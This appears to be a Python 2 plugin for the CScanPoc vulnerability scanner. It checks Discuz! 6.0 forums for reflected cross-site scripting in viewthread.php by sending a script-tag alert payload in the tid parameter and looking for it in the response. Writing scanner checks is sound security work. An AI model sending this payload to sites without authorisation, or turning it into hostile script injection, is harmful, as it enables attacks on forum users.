# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'Discuz_0000' # 平台漏洞编号，留空
    name = 'Discuz! 6.0 /viewthread.php 跨站脚本漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-10-29'  # 漏洞公布时间
    desc = '''
        Cross site scripting has benn found on viewthread.php file.
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '6.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '552d05dd-e81e-4eb9-8a15-847381b6c0a1'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/viewthread.php?tid="/><script>alert(233)</script>'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if '"/><script>alert(233)</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()